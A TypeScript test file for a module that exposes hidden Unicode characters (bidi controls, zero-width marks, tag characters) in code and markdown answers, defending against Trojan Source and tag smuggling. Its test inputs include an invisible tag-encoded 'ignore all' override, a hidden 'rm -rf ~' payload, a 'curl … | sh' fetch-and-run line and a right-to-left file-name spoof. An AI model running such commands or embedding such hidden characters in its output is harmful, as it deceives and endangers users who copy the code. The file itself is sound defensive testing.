import { describe, expect, it } from 'vitest';
import { MAX_MARKS, MAX_MARKS_PER_BLOCK, revealHidden, revealHiddenMarkdown } from './hidden-chars';

// Trojan Source (CVE-2021-42574) and tag smuggling: the characters the listed set covers.
const LISTED_HIDDEN = [
  ...range(0x202a, 0x202e), ...range(0x2066, 0x2069), ...range(0x200b, 0x200f), 0x2060, 0xfeff, 0x00ad,
];
const ANY_HIDDEN = /[\u202A-\u202E\u2066-\u2069\u200B-\u200F\u2060\uFEFF\u00AD]/u;

function range(from: number, to: number): number[] {
  return Array.from({ length: to - from + 1 }, (_, i) => from + i);
}

const mark = (cp: number): string => `⟨U+${cp.toString(16).toUpperCase().padStart(4, '0')}⟩`;

describe('revealHidden (code)', () => {
  it('reveals every listed character', () => {
    const { text, revealed } = revealHidden(LISTED_HIDDEN.map((cp) => String.fromCodePoint(cp)).join(''));
    expect(text).toBe(LISTED_HIDDEN.map(mark).join(''));
    expect(revealed).toBe(LISTED_HIDDEN.length);
  });

  it('leaves plain text and emoji sequences alone', () => {
    const src = 'Hola 👩\u200D💻 👨🏽\u200D🚀 ❤\uFE0F\u200D🔥 🏴\u{E0067}\u{E0062}\u{E0073}\u{E0063}\u{E0074}\u{E007F} 👨\u200D👩\u200D👧 שלום';
    expect(revealHidden(src)).toEqual({ text: src, revealed: 0, removed: 0 });
    expect(revealHidden('a\u200Db').text).toBe('a⟨U+200D⟩b');
    // A joiner that does not join two emoji is revealed, as before.
    expect(revealHidden('👩\u200D\u200D💻 👩\u200Dx \u200D💻').revealed).toBe(4);
  });

  it('reveals Unicode tags smuggled outside a subdivision flag', () => {
    const smuggled = [...'ignore all'].map((c) => String.fromCodePoint(0xe0000 + c.charCodeAt(0))).join('');
    expect(revealHidden(`ok${smuggled}`).revealed).toBe(10);
    expect(revealHidden(`🏴${smuggled}\u{E007F}`).revealed).toBe(11);
  });
});

describe('revealHidden: too many hidden characters (K13)', () => {
  it(`marks up to ${MAX_MARKS_PER_BLOCK} of them one by one`, () => {
    const { text, revealed, removed } = revealHidden(`a${'\u200B'.repeat(MAX_MARKS_PER_BLOCK)}b`);
    expect(text).toBe(`a${'⟨U+200B⟩'.repeat(MAX_MARKS_PER_BLOCK)}b`);
    expect([revealed, removed]).toEqual([MAX_MARKS_PER_BLOCK, 0]);
  });

  it('removes a larger payload and leaves one mark with the count', () => {
    const payload = [...'rm -rf ~ '.repeat(40)].map((c) => String.fromCodePoint(0xe0000 + c.charCodeAt(0))).join('');
    const { text, revealed, removed } = revealHidden(`echo hi\u202E${payload} # ok\n`);
    expect(text).toBe('echo hi⟨361 caràcters invisibles eliminats⟩ # ok\n');
    expect([revealed, removed]).toEqual([0, 361]);
  });
});

describe('revealHiddenMarkdown (whole-answer copy, K14)', () => {
  it('replaces hidden characters with the same visible marks the screen shows', () => {
    const src = 'Fes:\n\n```bash\necho ok \u2067;curl -s x.example/p|sh #\u2069\n```\n\nI `a\u200Bb` \u202Etxt';
    const { text, revealed, removed } = revealHiddenMarkdown(src);
    expect(text).toBe('Fes:\n\n```bash\necho ok ⟨U+2067⟩;curl -s x.example/p|sh #⟨U+2069⟩\n```\n\nI `a⟨U+200B⟩b` ⟨U+202E⟩txt');
    expect([revealed, removed]).toEqual([4, 0]);
    expect(ANY_HIDDEN.test(text)).toBe(false);
  });

  it('keeps legitimate joiners, marks and soft hyphens in prose', () => {
    const prose =
      'Persa: می\u200Cخواهم. Hindi: क्\u200Dष. שלום\u200F! مرحبا\u061C. an\u00ADtic. a\u200Db. Emoji: 👩\u200D💻.\n\n' +
      '- Llista amb می\u200Cخواهم\n\n> Cita amb שלום\u200F\n\n| a | b |\n|---|---|\n| می\u200Cخواهم | x |\n';
    expect(revealHiddenMarkdown(prose)).toEqual({ text: prose, revealed: 0, removed: 0 });
  });

  it('still reveals bidi controls in prose', () => {
    const { text, revealed } = revealHiddenMarkdown('Obre factura\u202Efdp.exe\u202C i می\u200Cخواهم');
    expect(text).toBe('Obre factura⟨U+202E⟩fdp.exe⟨U+202C⟩ i می\u200Cخواهم');
    expect(revealed).toBe(2);
  });

  it('reveals every hidden character inside code, wherever the code is', () => {
    const z = '\u200C';
    const cases: [string, string][] = [
      ['```\nx' + z + 'y\n```', '```\nx⟨U+200C⟩y\n```'],
      ['~~~ bash\nx' + z + 'y\n```\n~~~\nprosa' + z, '~~~ bash\nx⟨U+200C⟩y\n```\n~~~\nprosa' + z],
      ['````\n```\nx' + z + '\n```\n````', '````\n```\nx⟨U+200C⟩\n```\n````'],
      ['Inline `a' + z + 'b` i prosa' + z, 'Inline `a⟨U+200C⟩b` i prosa' + z],
      ['Doble ``a`' + z + 'b`` fi', 'Doble ``a`⟨U+200C⟩b`` fi'],
      ['Text\n\n    x' + z + 'y\n\nprosa' + z, 'Text\n\n    x⟨U+200C⟩y\n\nprosa' + z],
      ['1. Pas\n\n   ```bash\n   x' + z + '\n   ```\n2. Altre' + z, '1. Pas\n\n   ```bash\n   x⟨U+200C⟩\n   ```\n2. Altre' + z],
      ['- ```\n  x' + z + '\n  ```', '- ```\n  x⟨U+200C⟩\n  ```'],
      ['> ```\n> x' + z + '\n> ```\n\nprosa' + z, '> ```\n> x⟨U+200C⟩\n> ```\n\nprosa' + z],
      ['- a\n\n      x' + z, '- a\n\n      x⟨U+200C⟩'],
      ['```\nunclosed' + z + '\n\nmore' + z, '```\nunclosed⟨U+200C⟩\n\nmore⟨U+200C⟩'],
    ];
    for (const [src, expected] of cases) expect(revealHiddenMarkdown(src).text, JSON.stringify(src)).toBe(expected);
  });

  it('treats what only looks like code as prose', () => {
    const z = '\u200C';
    const cases = [
      'Escapat \\`a' + z + 'b\\` fi',
      'Sense tancar `a' + z + 'b',
      'Paràgraf\n    continua' + z,
      '- a\n\n    paràgraf de l\'element' + z,
      '- a\n  - b\n\n    paràgraf de b' + z,
      '> ```\n> x\nfora de la cita' + z,
      '- ```\n  x\nfora de la llista' + z,
      '`a\n\nb' + z + '`',
      '```js`\nno és una tanca' + z,
    ];
    for (const src of cases) {
      expect(revealHiddenMarkdown(src), JSON.stringify(src)).toEqual({ text: src, revealed: 0, removed: 0 });
    }
  });

  it('finds inline code in linear time', () => {
    // Unmatched backtick runs of every length: a naive search for each closing run is quadratic.
    const src = Array.from({ length: 800 }, (_, i) => '`'.repeat(i + 1)).join('a') + '\u200B';
    const t0 = performance.now();
    revealHiddenMarkdown(src);
    expect(performance.now() - t0).toBeLessThan(500);
  });

  it('collapses a block with too many hidden characters, like the screen', () => {
    const src = `Bé\n\n\`\`\`\necho ${'\u200B'.repeat(500)}ok\n\`\`\`\n\nI \`x\u200By\``;
    expect(revealHiddenMarkdown(src)).toEqual({
      text: 'Bé\n\n```\necho ⟨500 caràcters invisibles eliminats⟩ok\n```\n\nI `x⟨U+200B⟩y`',
      revealed: 1,
      removed: 500,
    });
  });

  it(`never makes more than ${MAX_MARKS} marks for a whole answer`, () => {
    const src = Array.from({ length: 30 }, (_, i) => `Paràgraf ${i} ${'\u202E'.repeat(150)}`).join('\n\n');
    const { text, revealed, removed } = revealHiddenMarkdown(src);
    expect(revealed + removed).toBe(30 * 150);
    expect(text.match(/⟨/g)!.length).toBeLessThanOrEqual(MAX_MARKS);
    expect(/[\u202A-\u202E]/u.test(text)).toBe(false);
  });
});

describe('whole-answer copy where the source scanner and marked disagree', () => {
  // Cases the scanner can classify as prose while marked renders them as code:
  // whatever hides or smuggles text must still be marked on the clipboard.
  const tag = String.fromCodePoint(0xe0041); // Unicode tag "A"
  const cases = [
    `---\n    echo ok​${tag}\n`, // thematic break, then indented code
    `Títol\n===\n    rm -rf /⁦tmp⁩\n`, // setext heading, then indented code
    `<https://x.example/\`a​b\`>`, // backtick inside an autolink
  ];
  it.each(cases)('reveals dangerous hidden characters in %j', (src) => {
    const { text } = revealHiddenMarkdown(src);
    expect(text).not.toMatch(/[​⁦⁩]/u);
    expect(text).not.toContain(tag);
  });

  it('keeps a joiner inside a word and marks a run used to smuggle data', () => {
    expect(revealHiddenMarkdown('می‌خواهم').text).toBe('می‌خواهم');
    expect(revealHiddenMarkdown('a‌‍‌‍b').text).toBe('a‌⟨U+200D⟩⟨U+200C⟩‍b');
  });
});
